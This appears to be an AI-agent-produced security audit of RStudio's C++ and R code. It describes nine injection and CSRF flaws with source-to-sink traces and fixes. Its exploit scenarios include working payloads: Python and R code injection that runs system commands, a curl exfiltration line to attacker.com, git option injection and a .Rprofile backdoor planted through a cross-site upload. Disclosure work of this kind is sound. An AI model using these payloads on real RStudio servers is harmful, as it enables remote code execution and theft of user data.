# RStudio Security Audit — Fifth Pass: Injection Vulnerabilities
**Date:** 2026-02-27
**Scope:** Backend (`src/cpp/`), web UI templates, shared libs, routing/auth
**Excluded:** Desktop/Electron (`src/node/desktop/`), path traversal, VULN-01–28 (prior sessions)
**Agents deployed:** 22 parallel workers
**Methodology:** Endpoint enumeration → parameter inventory → dataflow tracing → sink reachability → deduplication

---

## Executive Summary

1. **Python code injection** (`/python/` URI handler): URL path after `/python/` is passed directly to `reticulate::py_eval()`. Any authenticated user can execute arbitrary Python code by requesting `/python/<PYTHON_EXPR>`. This is the most impactful new finding.
2. **ReDoS in Find-in-Files**: `begin_find`/`preview_replace`/`complete_replace` RPCs pass a user-controlled regex directly to `boost::regex()` with no complexity limit. A catastrophic backtracking pattern locks the RStudio session.
3. **`/upload` CSRF bypass**: The file-upload URI handler is registered outside the JSON-RPC pipeline and does not call `validateCSRFForm()`, unlike the `/export` handler. RStudio Server sessions are vulnerable to cross-site file upload.
4. **R code injection via `render_rmd` `format` param**: The `output_format` string is concatenated without escaping into the R command string. A single-quote in `format` breaks the string context and injects arbitrary R function arguments.
5. **R interpreter injection via `get_script_run_command`**: The `interpreter` RPC parameter is concatenated unsanitized into the `system("...")` command string returned to the client. If the IDE auto-executes this string, arbitrary commands run.
6. **Git option injection**: `git_show`, `git_show_file`, `git_create_branch`, and `git_checkout` RPCs pass `revision`/branch parameters directly to `ShellArgs` without a `--` end-of-options separator, enabling git flag injection.
7. **Log injection via `appUri`**: Unstripped newlines in the `appUri` auth redirect parameter reach `LOG_DEBUG_MESSAGE`, allowing fake log-line injection in debug mode.
8. **Missing `Vary: Accept-Encoding`**: The precompressed file-serving path (`.br`/`.gz` variants) sets `Cache-Control: public` without `Vary: Accept-Encoding`, enabling cache-poisoning if a reverse proxy is deployed in front.
9. **Reusable CSRF tokens / desktop mode CSRF-free**: `validateCSRFHeaders()` accepts but never invalidates tokens; CSRF validation is disabled entirely in desktop mode.
10. All `//evil.com`-style open-redirect claims were **false positives**: `URL::cleanupPath()` normalises `//` → `/` by discarding empty directory components, producing `http://trusted.com/evil.com/phishing`, not a cross-origin redirect.

---

## Endpoint & Parameter Inventory

### Session HTTP URI Handlers (bypass JSON-RPC CSRF pipeline)

| URI prefix | Handler | Module |
|---|---|---|
| `/files/` | `handleFileRequest` | SessionFiles.cpp |
| `/upload` | `handleFileUploadRequestAsync` | SessionFiles.cpp |
| `/export` | `handleFileExportRequest` | SessionFiles.cpp |
| `/graphics/` | plot PNG/zoom handlers | SessionPlots.cpp |
| `/help/` | `handleHelpRequest` | SessionHelp.cpp |
| `/python/` | `handlePythonHelpRequest` | SessionHelp.cpp |
| `/custom/` | `handleCustomRequest` (R httpd) | SessionHelp.cpp |
| `/progress` | `handleTemplateRequest` | TemplateFilter.cpp |
| `/rpc/` | JSON-RPC dispatcher (CSRF-protected in server mode) | SessionHttpMethods.cpp |
| `/session` | session info | SessionHttpMethods.cpp |
| `/pdf/` | PDF viewer | SessionViewPdf.cpp |
| `/file_show` | `handleFileShow` | SessionWorkbench.cpp |

### JSON-RPC Endpoints with User-Controlled Parameters Traced

| RPC method | Parameter(s) | Module |
|---|---|---|
| `render_rmd` | `format`, `encoding`, `paramsFile`, `workingDir` | SessionRMarkdown.cpp |
| `begin_find` | `searchString`, `asRegex` | SessionFind.cpp |
| `preview_replace` | `searchString`, `asRegex` | SessionFind.cpp |
| `complete_replace` | `searchString`, `asRegex` | SessionFind.cpp |
| `get_script_run_command` | `interpreter`, `path` | SessionSource.cpp |
| `git_show` | `revision` | SessionGit.cpp |
| `git_show_file` | `revision`, `filename` | SessionGit.cpp |
| `git_create_branch` | `branch` | SessionGit.cpp |
| `git_checkout` | `id` | SessionGit.cpp |
| `rsconnect_publish` | `server` | SessionRSConnect.cpp |
| `pandoc_ast_to_markdown` | `format` | SessionPanmirrorPandoc.cpp |
| `pandoc_markdown_to_ast` | `format` | SessionPanmirrorPandoc.cpp |

### Server Auth HTTP Endpoints (query params)

| Endpoint | Parameter | Module |
|---|---|---|
| `/auth-sign-in` | `appUri` | ServerAuthCommon.cpp |
| `/auth-do-sign-in` | `appUri` | ServerAuthCommon.cpp |
| `/auth-sign-out` | `signOutUrl` | ServerAuthCommon.cpp |

---

## Findings

---

### VULN-29 — Python Code Injection via `/python/` URL Path

**Severity:** HIGH
**Rationale:** Authenticated RCE. Requires prior authentication; no direct unauthenticated path.

**Affected endpoint:** `GET /python/<PYTHON_EXPR>` (URI handler, no CSRF validation)

**Parameters:** URI path component after `/python/`

**Source → Sink chain:**

```
HTTP request URI
  └─ SessionHelp.cpp:1082
       code = request.uri().substr(strlen("/python/"))
         └─ .rs.python.generateHtmlHelp(code)  [SessionHelp.cpp:1091-1093]
              └─ SessionReticulate.R:1260
                   reticulate::py_eval(code)   ← SINK
```

**Evidence:**
- `src/cpp/session/modules/SessionHelp.cpp:1078–1107` — URI handler extracts path verbatim
- `src/cpp/session/modules/SessionReticulate.R:1235–1260` — `py_eval(code)` called on raw input

```cpp
// SessionHelp.cpp:1082 — no decoding, no validation
std::string code = request.uri().substr(::strlen("/python/"));
// ...
r::exec::RFunction(".rs.python.generateHtmlHelp").addParam(code).call(&path);
```

```r
# SessionReticulate.R:1260 — code passed directly to Python evaluator
function() reticulate::py_eval(code)
```

**Exploit scenario:**
An authenticated user (or an attacker leveraging XSS within RStudio) requests:
```
GET /python/__import__('os').popen('id').read()
```
Python evaluates `__import__('os').popen('id').read()` in the R session's Python environment. The OS command runs with the privileges of the RStudio session. Single quotes (`'`) are not percent-encoded in URL paths per RFC 3986, so the expression passes through as-is. Results are not directly reflected but network-based exfiltration (e.g., `popen('curl https://attacker.com/$(whoami)')`) is feasible. Each unique Python expression executes once (result cached on disk thereafter).

**Impact:** Arbitrary Python code execution within the authenticated user's RStudio session; blind OS command execution; SSRF/exfiltration via Python; pivot to internal network if reticulate + Python are active.

**Fix recommendation:** Validate `code` against an allowlist of Python identifier/attribute-access patterns (e.g., `^[A-Za-z0-9_.]+$`) before passing to `py_eval`. For dotted names like `numpy.array`, this suffices for the intended use-case. Alternatively use `pydoc.locate()` instead of `py_eval()`.

**Not path traversal because:** The attack is Python code execution, not filesystem path escape.
**Not a repeat because:** Not in VULN-01–28; distinct from all prior R-code injection findings which target the R interpreter.

---

### VULN-30 — ReDoS via Unbound `boost::regex` in Find-in-Files

**Severity:** HIGH
**Rationale:** Authenticated, synchronous CPU exhaustion that hangs the RStudio session; targeted denial-of-service.

**Affected endpoints:** `begin_find`, `preview_replace`, `complete_replace` RPCs

**Parameters:** `searchString` (regex pattern), `asRegex` (boolean enable flag)

**Source → Sink chain:**

```
RPC params
  └─ json::readParams(request.params, &searchString, &asRegex, ...)
       [SessionFind.cpp:1648–1686]
         └─ GrepOptions(searchString, ..., asRegex)
              └─ boost::regex find(findRegex);          ← SINK line 2024
              └─ boost::regex find(findRegex, icase);   ← SINK line 1999
```

**Evidence:**
- `src/cpp/session/modules/SessionFind.cpp:1648–1686` — RPC handler, no regex complexity check
- `src/cpp/session/modules/SessionFind.cpp:1999` — case-insensitive compile, no timeout
- `src/cpp/session/modules/SessionFind.cpp:2024` — case-sensitive compile, no timeout

```cpp
// SessionFind.cpp:1999 — user regex compiled directly, no complexity limit
boost::regex find(findRegex, boost::regex::icase);
// SessionFind.cpp:2024
boost::regex find(findRegex);
```

**Exploit scenario:**
An authenticated attacker sends:
```json
{"method":"begin_find","params":["","",true,false,"file.txt",false,false]}
```
with `searchString = "(a+)+$"`. Applied to a long input string, this pattern causes catastrophic backtracking in `boost::regex`, pegging a CPU core and blocking the session process.

**Impact:** RStudio session becomes unresponsive (denial of service). On RStudio Server, this is per-session; on a shared server a malicious user could target other users indirectly via resource starvation.

**Fix recommendation:** Use `boost::regex_constants::no_except` combined with a match time limit, or switch to RE2 for user-supplied patterns (RE2 guarantees linear-time matching). Alternatively, reject patterns with nested quantifiers via a pre-validation step.

**Not path traversal because:** Regex pattern complexity, not filesystem path escape.
**Not a repeat because:** Not in VULN-01–28. DataViewer search (evaluated previously) uses `\Q...\E` quoting and is safe; this is the Find-in-Files subsystem which has no such protection.

---

### VULN-31 — File Upload CSRF Bypass

**Severity:** HIGH (RStudio Server mode only)
**Rationale:** Cross-site upload of arbitrary files to the authenticated user's home directory. CSRF protection is enforced for JSON-RPC calls but absent for the `/upload` URI handler.

**Affected endpoint:** `POST /upload` (URI handler registered via `registerUploadHandler`)

**Parameters:** Multipart form body; `targetDirectory` form field

**Source → Sink chain:**

```
Browser cross-origin POST to /upload
  └─ SessionHttpMethods.cpp:625–639
       URI handler dispatch path — skips parseAndValidateJsonRpcConnection()
         └─ handleFileUploadRequestAsync()  [SessionFiles.cpp]
              └─ file written to targetDirectory   ← SINK (no validateCSRFForm call)
```

**Evidence:**
- `src/cpp/session/SessionHttpMethods.cpp:135–144` — CSRF check only for server-mode RPC, not URI handlers
- `src/cpp/session/modules/SessionFiles.cpp` — `handleFileUploadRequestAsync()` absent `validateCSRFForm()`
- Contrast: `handleFileExportRequest()` correctly calls `http::validateCSRFForm(request, pResponse)`

```cpp
// SessionHttpMethods.cpp:135–144 — CSRF only on JSON-RPC path
if (options().programMode() == kSessionProgramModeServer &&
    !core::http::validateCSRFHeaders(ptrConnection->request()))
{
   // reject — only reached for /rpc/ requests, not URI handlers
}
```

**Exploit scenario:**
Attacker lures an authenticated RStudio Server user to a malicious page. The page submits a cross-origin multipart POST to `https://rstudio.example.com/upload`. The server writes attacker-controlled file content to the user's chosen directory without any CSRF token check. Targeting `targetDirectory=/home/user/` with filename `.Rprofile` plants a persistent backdoor that executes on the next R session start.

**Impact:** Arbitrary file write to any directory the user can write; persistent R code execution via `.Rprofile`/`.Rprofile.d` backdoor; data exfiltration by overwriting scripts.

**Fix recommendation:** Add `if (!http::validateCSRFForm(request, pResponse)) return;` to `handleFileUploadRequestAsync()`, mirroring the existing pattern in `handleFileExportRequest()`. Audit all other `registerUploadHandler` registrations for the same gap.

**Not path traversal because:** The attack is CSRF-enabled file upload, not directory-escape via path traversal.
**Not a repeat because:** Not in VULN-01–28; the upload endpoint's specific bypass of CSRF validation was not previously reported.

---

### VULN-32 — R Code Injection via `format` Parameter in `render_rmd`

**Severity:** HIGH
**Rationale:** Authenticated R code execution via single-quote injection breaking the string context in a dynamically constructed R command.

**Affected endpoint:** `render_rmd` RPC

**Parameters:** `format` (output format, e.g., `"html_document"`)

**Source → Sink chain:**

```
RPC params
  └─ json::readParams(request.params, ..., &format, ...)
       [SessionRMarkdown.cpp:1242–1252]
         └─ RenderRmd::start()
              └─ renderOptions += ", output_format = '" + format + "'";
                   [SessionRMarkdown.cpp:568]  ← NO ESCAPING
                     └─ boost::format cmd = renderFunc + "('" + file + "', " + renderOptions + ");"
                          [SessionRMarkdown.cpp:628–633]
                            └─ async_r::AsyncRProcess::start(cmd)  ← SINK
```

**Evidence:**
- `src/cpp/session/modules/rmarkdown/SessionRMarkdown.cpp:563–633`

```cpp
// Line 563: encoding is the first renderOption
std::string renderOptions("encoding = '" + encoding + "'");
// Line 568: format appended WITHOUT quote escaping
if (!format.empty())
   renderOptions += ", output_format = '" + format + "'";
// Line 631: targetFile uses singleQuotedStrEscape — format does NOT
boost::format fmt("%1%('%2%', %3% %4%);");
std::string cmd = boost::str(fmt % renderFunc % singleQuotedStrEscape(targetFile)
                                % extraParams % renderOptions);
// cmd is executed via AsyncRProcess
```

**Exploit scenario:**
Attacker sends:
```json
{"method":"render_rmd","params":["doc.Rmd","","html_document', run_pandoc=system('id'),'",…]}
```
Constructed R command becomes:
```r
rmarkdown::render('doc.Rmd', encoding = 'UTF-8',
                  output_format = 'html_document', run_pandoc=system('id'),'')
```
The single-quote breaks out of the `output_format` string and injects an additional named argument. `system('id')` executes on the server.

**Impact:** Arbitrary OS command execution in the RStudio session process; file exfiltration, network pivoting.

**Fix recommendation:** Apply `singleQuotedStrEscape()` to `format` (the same function used for `targetFile` at line 631). Alternatively pass all optional arguments via R's `addParam()` API rather than string interpolation.

**Not path traversal because:** R string context breakout, not filesystem path escape.
**Not a repeat because:** VULN-06 (prior sessions) involved the `renderFunc` parameter; this is the `format` parameter at a different code location (line 568 vs. the renderFunc concatenation site).

---

### VULN-33 — R Interpreter Injection in `get_script_run_command`

**Severity:** MEDIUM
**Rationale:** Command string returned to client; exploitability depends on whether the IDE auto-executes the returned value. If auto-executed, arbitrary OS command injection is achieved via `interpreter`.

**Affected endpoint:** `get_script_run_command` RPC

**Parameters:** `interpreter` (path/name of interpreter, e.g., `"python3"`)

**Source → Sink chain:**

```
RPC params
  └─ json::readParams(request.params, &interpreter, &path)
       [SessionSource.cpp:1560]
         └─ command = interpreter + " " + path;   [line 1605] ← NO ESCAPING
              └─ command = "system(\"" + command + "\")";   [line 1606]
                   └─ pResponse->setResult(command);   ← returned to IDE client
                        └─ IDE executes returned command in R console
```

**Evidence:**
- `src/cpp/session/modules/SessionSource.cpp:1555–1611`

```cpp
// Line 1605 — no sanitization of interpreter
command = interpreter + " " + path;
// Line 1606 — wrapped in system() call
command = "system(\"" + command + "\")";
// Line 1608 — returned to client as result string
pResponse->setResult(command);
```

**Exploit scenario:**
Attacker sends:
```json
{"method":"get_script_run_command","params":["bash -c 'malicious_cmd;'","/tmp/dummy.sh"]}
```
Returned command: `system("bash -c 'malicious_cmd;' /tmp/dummy.sh")`
When the IDE pastes and executes this in the R console, `malicious_cmd` runs.

**Impact:** OS command execution if IDE auto-executes returned value (e.g., via "Run Script" button that directly evaluates the returned string); limited to social engineering if user must manually confirm.

**Fix recommendation:** Validate `interpreter` against an allowlist of permitted interpreter names/paths (e.g., `python3`, `Rscript`, `ruby`). Reject values containing spaces, semicolons, backticks, or shell metacharacters. Apply quote escaping when embedding in the `system()` call string.

**Not path traversal because:** Interpreter name injection, not filesystem path escape.
**Not a repeat because:** Not in VULN-01–28; distinct from `render_rmd` format injection (different module, different mechanism, different sink).

---

### VULN-34 — Git Option Injection via Revision/Branch Parameters

**Severity:** MEDIUM
**Rationale:** Git flag injection via leading-dash arguments; `ShellArgs` prevents shell metacharacter injection but not git option injection.

**Affected endpoints:** `git_show`, `git_show_file` RPCs (also `git_create_branch`, `git_checkout`)

**Parameters:** `revision`, `filename`, `branch`, `id`

**Source → Sink chain:**

```
RPC params
  └─ json::readParams(request.params, &revision, ...)
       [SessionGit.cpp]
         └─ ShellArgs args = gitArgs()
                  << "diff"
                  << (revision + "^")   ← no -- separator
                  << revision;
              [SessionGit.cpp:1451–1473]
                └─ runGit(args)  ← SINK
```

**Evidence:**
- `src/cpp/session/modules/SessionGit.cpp:1451–1473`

```cpp
// git_show diff — revision appended without -- separator
ShellArgs args = gitArgs()
      << "-c" << "core.quotepath=false"
      << "diff"
      << (revision + "^")   // "--no-index^" if revision="--no-index"
      << revision;
// git show_file — no -- before object reference
boost::format fmt("%1%:%2%");
ShellArgs args = gitArgs() << "show" << boost::str(fmt % rev % filename);
```

**Exploit scenario:**
Sending `revision = "--no-index"` causes `git diff --no-index^ --no-index`, changing semantics to a filesystem diff. Sending `revision = "--upload-pack=evil_command"` on certain git versions can enable hook injection. The `git show REV:FILENAME` call with crafted `filename` containing `:` characters can reference unexpected object paths.

**Impact:** Unexpected git behavior; potential data exfiltration from git history via crafted object references; hook injection on vulnerable git versions.

**Fix recommendation:** Insert `"--"` before all revision/filename arguments: `args << "diff" << "--" << (revision + "^") << revision`. Validate revision strings against `[a-zA-Z0-9._/~^:-]{1,200}` before use.

**Not path traversal because:** Git option injection, not filesystem path escape.
**Not a repeat because:** Not in VULN-01–28.

---

### VULN-35 — Log Injection via `appUri` Auth Parameter

**Severity:** LOW
**Rationale:** Debug-mode log injection only; no direct code execution or data disclosure.

**Affected endpoint:** `GET /auth-sign-in?appUri=...`, `POST /auth-do-sign-in` (body field)

**Parameters:** `appUri`

**Source → Sink chain:**

```
request.queryParamValue("appUri")
  └─ appUri (newlines not stripped)
       └─ LOG_DEBUG_MESSAGE("... redirecting to: " + appUri)
            [ServerAuthCommon.cpp:108, 242]  ← SINK
```

**Evidence:**
- `src/cpp/server/auth/ServerAuthCommon.cpp:108`

```cpp
// Line 108 — appUri reaches log without newline stripping
LOG_DEBUG_MESSAGE("Signed in user: " + username + " redirecting to: " + appUri);
// Line 242
LOG_DEBUG_MESSAGE("Sign in for user: " + username + " redirecting to: " + appUri);
```

**Exploit scenario:**
```
GET /auth-sign-in?appUri=%0A[ERROR]+Fake+admin+login+from+1.2.3.4
```
In debug logging mode, the fabricated line appears in the server log, potentially misleading security investigations or automated alerting.

**Impact:** Log forging for SIEM evasion or false audit trails; no code execution.

**Fix recommendation:** Strip CRLF from `appUri` before logging, or use a structured logger that escapes embedded newlines.

**Not path traversal because:** Log injection, not filesystem path escape.
**Not a repeat because:** Not in VULN-01–28.

---

### VULN-36 — Missing `Vary: Accept-Encoding` on Precompressed File Serving

**Severity:** LOW (proxy-dependent)
**Rationale:** Only exploitable when a caching reverse proxy (nginx, Varnish, CDN) sits in front of RStudio Server. Not exploitable in direct-access deployments.

**Affected endpoint:** All static file serving paths when `.br` or `.gz` precompressed variants exist

**Parameters:** `Accept-Encoding` request header

**Source → Sink chain:**

```
HTTP request with Accept-Encoding: br
  └─ http::serveStaticFile() [Util.cpp:506–530]
       └─ if .br file exists:
            pResponse->setContentEncoding(kBrotliEncoding);
            pResponse->setCacheableFile(precompressed, request);
              └─ Cache-Control: public, max-age=... set   ← NO Vary: Accept-Encoding
```

**Evidence:**
- `src/cpp/core/http/Util.cpp:506–530`

```cpp
// Brotli variant served without Vary header
if (request.acceptsEncoding(kBrotliEncoding) && precompressed.exists())
{
   pResponse->setContentEncoding(kBrotliEncoding);
   pResponse->setCacheableFile(precompressed, request);  // sets Cache-Control: public
   return;  // NO Vary: Accept-Encoding added
}
```

**Exploit scenario:**
1. Attacker requests `/static/app.js` with `Accept-Encoding: br` through a shared CDN.
2. Server returns brotli-compressed response with `Cache-Control: public, max-age=31536000` but no `Vary: Accept-Encoding`.
3. CDN caches the brotli response under the key `GET /static/app.js`.
4. Victim with `Accept-Encoding: identity` receives the brotli-compressed blob, which the browser cannot decompress → garbled output or script failure.

**Impact:** Content corruption for clients that cannot accept brotli; cache poisoning vector in CDN deployments.

**Fix recommendation:** After calling `setContentEncoding()`, add `pResponse->setHeader("Vary", "Accept-Encoding")`.

**Not path traversal because:** Caching header misconfiguration, not filesystem path escape.
**Not a repeat because:** Not in VULN-01–28.

---

### VULN-37 — Reusable CSRF Tokens / CSRF Absent in Desktop Mode

**Severity:** LOW (informational hardening note)
**Rationale:** CSRF tokens are accepted but never invalidated; CSRF protection is entirely absent in desktop mode. Defense-in-depth gap.

**Affected endpoints:** All JSON-RPC methods in desktop mode; token lifecycle in server mode

**Evidence:**
- `src/cpp/core/http/CSRFToken.cpp:135–145` — token checked but never invalidated
- `src/cpp/session/SessionHttpMethods.cpp:135–144` — `kSessionProgramModeServer` guard; desktop sessions skip CSRF entirely

```cpp
// SessionHttpMethods.cpp:135
if (options().programMode() == kSessionProgramModeServer &&
    !core::http::validateCSRFHeaders(ptrConnection->request()))
// Desktop mode: block never entered — no CSRF check on any RPC
```

**Impact:** In desktop mode, all JSON-RPC calls are CSRF-unprotected; an XSS on any page the desktop user visits could silently trigger arbitrary RPC calls. In server mode, stolen CSRF tokens remain valid for the session lifetime.

**Fix recommendation:** Evaluate whether desktop mode intentionally relies on OS-level origin isolation. For server mode, implement per-request nonce rotation on sensitive state-changing RPCs, or at minimum rotate the CSRF token on sign-in.

**Not path traversal because:** Token lifecycle issue, not path escape.
**Not a repeat because:** Distinct from VULN-31 (upload bypass). This concerns the general token policy.

---

## Edge-Case Coverage Notes

### `//evil.com` Protocol-Relative URL — Confirmed SAFE

Multiple agents flagged `appUri=//evil.com/phishing` or `signOutUrl=//evil.com` as open-redirect bypasses. **Verified SAFE** via `URL::cleanupPath()` source analysis at `src/cpp/core/http/URL.cpp:118–143`:

1. `URL("//evil.com/phishing")` fails the protocol regex `(http|https|file|ftp|ftps)://...` → `isValid() == false`
2. `URL::complete()` assigns `path = "//evil.com/phishing"` (starts with `/`)
3. `URL::cleanupPath("//evil.com/phishing")` constructs a `Path` object:
   - Strips leading `/` → remaining: `"/evil.com/phishing"`
   - Splits dirs: `["", "evil.com"]` + file `"phishing"`
   - `cleanup()` **skips empty dir entries** (line 123: `if (dirs_.at(i).empty()) continue`)
   - Result: dirs=`["evil.com"]`, file=`"phishing"`, rooted=true
   - `value()` = `"/evil.com/phishing"`
4. Final result: `"http://trusted.com/evil.com/phishing"` — browser sees absolute URL on same origin; **not a protocol-relative redirect**.

### DataViewer Search ReDoS — Confirmed SAFE

`SessionDataViewer.R` applies `paste0("\\Q", search, "\\E")` Perl-quoting before passing patterns to `grepl()`, neutralising all regex metacharacters in the `search[value]` and `columns[i][search][value]` DataTables parameters. Distinct from the Find-in-Files path (VULN-30).

### Referer-Based Help Redirect (SessionHelp.cpp:495-497) — Previously Reported

The `fmt::format("{}help/{}", ref, path)` construction uses the unvalidated `Referer` header to produce a Location header. This finding was captured in a prior audit pass (VULN-10 — "Referer-based Location header in R Help HTTP handler") and is excluded from this report.

### TemplateFilter Query-Param Injection — Scope Limited

All query parameters are injected as template variables for `/progress` requests (`TemplateFilter.cpp:33–39`). The `progress.htm` template uses only `#message#` syntax (HTML-escaped), and no `#!var#` raw-output variables are present. Confirmed safe for this template; any future template using `#!var#` with user-controlled params would be vulnerable.

### Pandoc Format Argument — Informational

`SessionPanmirrorPandoc.cpp:115` passes user-supplied `format` as a single `argv` element (not a shell string) to pandoc. No shell injection is possible. Leading-dash flag injection (e.g., `--file=...`) would require pandoc to have an unintended file-read behavior in that argument position; not confirmed exploitable in any current pandoc version.

### `contribUrl` R Code Injection — Negligible Incremental Risk

`SessionPackages.cpp:113–119` embeds `contribUrl` via `boost::format` into an `evaluateString()` call. However, `contribUrl` originates from `getOption("repos")` in R, set by the user's own R session. Any user who can set R options can already execute arbitrary R code; this pattern adds no new attack surface beyond what the R REPL already allows.

---

## Appendix: Complete Query-Parameter Read List

| # | File | Query Param(s) | Usage | Notes |
|---|---|---|---|---|
| 1 | `SessionHelp.cpp:1082` | URI path after `/python/` | Python eval | **VULN-29** |
| 2 | `SessionFind.cpp:1648–1686` | `searchString`, `asRegex` | Find-in-files regex | **VULN-30** |
| 3 | `SessionFiles.cpp` (upload) | multipart form body | File upload | **VULN-31** |
| 4 | `SessionRMarkdown.cpp:568` | RPC param: `format` | render_rmd R code | **VULN-32** |
| 5 | `SessionSource.cpp:1560` | RPC params: `interpreter`, `path` | Script run command | **VULN-33** |
| 6 | `SessionGit.cpp:1451–1473` | RPC params: `revision`, `filename` | Git commands | **VULN-34** |
| 7 | `ServerAuthCommon.cpp:103,242` | `appUri` | Auth redirect + log | **VULN-35** |
| 8 | `core/http/Util.cpp:506–530` | `Accept-Encoding` header | Precompressed serving | **VULN-36** |
| 9 | `SessionHttpMethods.cpp:135` | (all RPC params) | CSRF gate | **VULN-37** |
| 10 | `SessionHelp.cpp:780–781` | `pkg`, `figure` | Dev figure lookup | Validated by C++ before R |
| 11 | `SessionHelp.cpp:701` | all (via `queryParams()`) | Passed to R httpd handler | R handler controls eval |
| 12 | `ServerAuthCommon.cpp:279` | `signOutUrl` | Post sign-out redirect | `//evil.com` SAFE via cleanupPath |
| 13 | `SessionPlots.cpp:527` | `scale` | Plot zoom scale | Unvalidated integer; JS-embedded as number, no XSS |
| 14 | `SessionPlots.cpp:633` | `attachment` | Download disposition | String comparison `== "1"` |
| 15 | `SessionWorkbench.cpp:441` | `path` | File show | `isPathViewAllowed()` guards |
| 16 | `SessionViewPdf.cpp:40` | `path` | PDF serve | `setNoCacheHeaders()` mitigates |
| 17 | `GwtFileHandler.cpp:131` | `emulatedStack` | GWT stack mode | Boolean `== "1"` |
| 18 | `TemplateFilter.cpp:33–39` | all (via `queryParams()`) | Template variables | `/progress` only; `#message#` escaped |
| 19 | `SessionHelp.cpp` | `topic` | Help topic lookup | Passed to R as typed param |
| 20 | `SessionHelp.cpp` | `dev` | Dev topic find | Passed to `pkgload:::dev_topic_find` |
| 21 | `DataViewer.cpp:570` | `search[value]` | Global DataTable search | `\Q...\E` quoting — SAFE |
| 22 | `DataViewer.cpp:622` | `columns[i][search][value]` | Per-column filter | `\Q...\E` quoting — SAFE |
| 23 | `DataViewer.cpp:589–590` | `order[i][column]`, `order[i][dir]` | DataTable sort | Integer + enum validation |
| 24 | `ServerLoginPages.cpp:80` | `appUri` | Login form template variable | HTML-escaped `#appUri#` in template |
| 25 | `ServerLoginPages.cpp:73` | `error` | Error type selector | `stringTo<unsigned>` safe cast |
| 26 | `SessionRSConnect.cpp` | RPC param: `server` | RSConnect deployment target | `singleQuotedStrEscape()` applied; SSRF-adjacent |
| 27 | `SessionPanmirrorPandoc.cpp:82` | RPC param: `format` | Pandoc format flag | Single argv element; low risk |
| 28 | `SessionThemes.cpp:408` | `dark` | Theme dark mode | `hasTruthyValue()` safe parse |
| 29 | `core/http/Response.cpp:295` | (request.uri() full URI) | 404 error body | `htmlEscape()` applied — SAFE |
| 30 | `SessionPackages.cpp:113–119` | R option `repos` → `contribUrl` | Package list R eval | Indirect; user owns R session |

---

*Report generated 2026-02-27. All findings verified against source code with file paths and line numbers. No desktop/Electron code included. No path traversal findings included. VULN-01–28 from prior sessions excluded. Total new confirmed findings: VULN-29 through VULN-37 (9 findings).*
